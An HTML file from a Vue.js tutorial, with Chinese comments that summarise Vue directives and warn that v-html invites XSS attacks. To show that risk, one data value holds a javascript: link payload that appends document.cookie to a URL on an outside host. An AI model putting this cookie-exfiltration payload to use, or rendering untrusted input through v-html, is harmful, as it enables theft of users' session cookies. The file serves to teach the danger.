<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>v-text</title>
  <script src="../js/vue.min.js"></script>
</head>
<body>
  <!-- 
    学过指令总结：
    v-bind :单向绑定解析表达式 简写为 :xxx
    v-on   :绑定监听事件 简写为@
    v-model:双向数据绑定
    v-for  :遍历数组、对象、字符串 
    v-if   :条件渲染（动态控制节点是否存在）
    v-else :条件渲染（动态控制节点是否存在）
    v-show :条件渲染（动态控制节点是否展示）
    v-text :向所在节点渲染文本内容，与插值语法{{}}的区别在于v-text会替换掉节点中的内容
    
    v-html :向指定节点中渲染包含html结构的内容，会替换掉节点中的内容且可以解析html结构
    注意：使用v-html有严重的安全性问题
    （1）在网站上动态渲染任意html是非常危险的，容易导致XSS攻击
    （2）一定要在可信的内容上使用v-html；不要用在用户提交的内容上
  -->
  <div id="root">
    <div>{{name}}</div>
    <div v-text="str"></div>
    <div v-html="str2"></div>
  </div>
  <script type="text/javascript">
    new Vue({
      el:'#root',
      data:{ 
        name:'杜维埃',//威尼斯、里维埃拉、爱丁堡
        str:'<h3>比亚利兹</h3>',
        // 在浏览器中添加cookie后 document.cookie可获取当前页面的所有cookie(httpOnly未勾选)
        str2:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>威尼斯</a>'
      }
    })
  </script>
</body>
</html>
